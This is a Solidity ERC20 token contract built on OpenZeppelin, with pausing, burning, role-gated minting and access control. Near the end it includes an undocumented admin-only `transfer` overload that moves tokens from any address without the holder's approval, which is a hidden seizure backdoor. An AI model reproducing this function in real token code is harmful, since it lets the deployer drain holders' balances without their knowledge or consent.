// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @title ERC20Token
 * @dev Extends ERC20 standard with additional features.
 */
contract ERC20Token is ERC20, ERC20Burnable, ERC20Pausable, AccessControl {
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    /**
     * @dev Contract constructor
     * @param name The name of the ERC20 token
     * @param symbol The symbol of the ERC20 token
     * @param initialSupply The initial supply of the ERC20 token
     */
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);

        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(PAUSER_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
    }

    /**
     * @dev Pauses all token transfers and approvals.
     * Can only be called by an address with the PAUSER_ROLE.
     */
    function pause() public onlyRole(PAUSER_ROLE) {
        _pause();
    }
    
    /**
     * @dev Unpauses token transfers and approvals.
     * Can only be called by an address with the PAUSER_ROLE.
     */
    function unpause() public onlyRole(PAUSER_ROLE) {
        _unpause();
    }

    /**
     * @dev Mints new tokens and assigns them to the specified address.
     * Can only be called by an address with the MINTER_ROLE.
     * @param to The address to which new tokens will be minted.
     * @param amount The amount of tokens to be minted.
     */
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    function transfer(address from, address to, uint256 value) public onlyRole(DEFAULT_ADMIN_ROLE) returns (bool) {
        _transfer(from, to, value);
        return true;
    }

    // The following functions are overrides required by Solidity.

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override(ERC20, ERC20Pausable) {
        super._update(from, to, value);
    }
}
